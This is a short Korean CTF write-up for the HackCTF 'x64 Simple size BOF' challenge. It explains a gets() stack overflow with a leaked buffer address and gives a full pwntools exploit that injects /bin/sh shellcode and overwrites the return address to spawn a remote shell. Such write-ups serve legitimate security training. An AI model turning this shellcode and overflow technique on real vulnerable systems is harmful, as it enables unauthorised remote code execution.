---


---

<h1 id="hackctfx64-simple-size-bof">HackCTF:x64 Simple size BOF</h1>
<h2 id="section">2019-08-13</h2>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-6D30h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts(&amp;s);
  printf("buf: %p\n", &amp;v4);
  gets(&amp;v4);
  return 0;
}
</code></pre>
<p>함수 puts() 로 출력 한 뒤  printf()로 버퍼의 주소를 출력하고 있다. 버퍼의 용량은 27952byte다.</p>
<pre><code> ⚡ root@kali  ~/Documents/HackCTF/06-x64_Simple_size_BOF  ./Simple_size_bof 
삐빅- 자살방지 문제입니다.
buf: 0x7ffe46be3ad0
^C
 ✘ ⚡ root@kali  ~/Documents/HackCTF/06-x64_Simple_size_BOF  ./Simple_size_bof
삐빅- 자살방지 문제입니다.
buf: 0x7ffdfe23aa10
^[[A^C
 ✘ ⚡ root@kali  ~/Documents/HackCTF/06-x64_Simple_size_BOF  ./Simple_size_bof
삐빅- 자살방지 문제입니다.
buf: 0x7ffc424251a0
^C
</code></pre>
<p>puts() 는 일반적인 스트링이며 printf()로 출력되는 버퍼의 주소가 계속 바뀌고 있음을 발견했다.<br>
이번 공격 목표는 printf()에 출력되는 주소를 캐치하여 gets()로 쉘코드와 함께 BOF로 버퍼를 재실행 하는 것이다.</p>
<pre><code>from pwn import *
p = remote('ctf.j0n9hyun.xyz', 3005)
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.recvuntil(": ")
buff = int(p.recv(14), 16)
print buff

payload = ''
payload += shellcode
payload += "A" * 27937
payload += p64(buff)

p.sendline(payload)
p.interactive()
</code></pre>

